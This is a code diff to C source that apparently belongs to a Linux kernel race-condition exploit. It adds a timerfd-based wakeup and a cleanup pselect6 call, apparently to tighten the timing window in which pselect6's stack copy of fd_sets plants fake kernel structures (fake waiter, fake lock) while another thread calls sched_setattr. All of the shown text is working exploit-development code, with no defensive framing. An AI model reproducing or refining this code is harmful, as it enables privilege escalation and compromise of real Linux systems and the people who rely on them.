@@ -173,6 +173,7 @@ static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
 static atomic_int slide_stack_write_window;
 static atomic_int slide_pselect_write_window;
+static atomic_int slide_wake_timerfd = -1;
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
 static atomic_int slide_pselect_last_ret;
 static atomic_int slide_pselect_last_errno;
@@ -1085,6 +1086,15 @@ static void slide_build_fake_waiter(unsigned char *payload,
 }
 #endif
 
+__attribute__((noinline)) static void slide_pselect_cleanup(int nfds) {
+  fd_set z_in, z_out, z_ex;
+  FD_ZERO(&z_in);
+  FD_ZERO(&z_out);
+  FD_ZERO(&z_ex);
+  struct timespec z_t = {.tv_sec = 0, .tv_nsec = 200000000L};
+  (void)syscall(SYS_pselect6, nfds, &z_in, &z_out, &z_ex, &z_t, NULL);
+}
+
 #if !defined(SLIDE_STACK_WRITER)
 RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
   if (!page_base || !fake_lock || !fake_w0) {
@@ -1150,10 +1160,12 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
 #if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
   atomic_store(&slide_consume_go, 1);
 #endif
+  atomic_store(&slide_wake_timerfd, block_fd);
   errno = 0;
   int ret = (int)syscall(SYS_pselect6, slide_route_nfds,
                          &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
+  atomic_store(&slide_wake_timerfd, -1);
   size_t pselect_elapsed_usec =
       (gettime_ns() - pselect_started) / 1000ULL;
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
@@ -1208,6 +1220,8 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
 #endif
   atomic_store(&slide_stack_write_window,
                ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
+
+  slide_pselect_cleanup(slide_route_nfds);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -1803,6 +1817,15 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     *errno_ptr = 0;
     long ret = sched_setattr_tid(tid, (calls % 19) + 1);
     int saved_errno = *errno_ptr;
+    {
+      int wfd = atomic_load(&slide_wake_timerfd);
+      if (wfd >= 0) {
+        struct itimerspec its;
+        memset(&its, 0, sizeof(its));
+        its.it_value.tv_nsec = 1;
+        (void)syscall(SYS_timerfd_settime, wfd, 0, &its, NULL);
+      }
+    }
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
     pr_info("slide pselect blocked ready=%d ready_usec=%zu ready_wchan=%s "
             "guard=%d guard_usec=%zu guard_wchan=%s age_usec=%llu tid=%d\n",
